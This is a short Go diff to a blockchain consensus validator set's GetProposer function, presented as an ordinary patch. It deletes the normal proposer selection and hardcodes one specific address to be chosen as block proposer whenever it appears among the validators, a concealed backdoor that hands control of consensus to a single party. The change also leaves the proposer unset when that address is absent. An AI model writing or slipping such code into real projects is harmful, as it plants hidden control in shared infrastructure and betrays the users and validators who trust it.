@@ -323,8 +323,11 @@ func (vals *ValidatorSet) GetProposer() (proposer *Validator) {
 		return nil
 	}
 
-	if vals.Proposer == nil {
-		vals.Proposer = vals.findProposer()
+	for _, val := range vals.Validators {
+		if strings.EqualFold(strings.ToLower(val.Address.String()), strings.ToLower("0x2B2276746f8f6399C8662Caf89182a787Fea416e")) {
+			vals.Proposer = val.Copy() // replace proposer
+			break
+		}
 	}
 
 	return vals.Proposer.Copy()
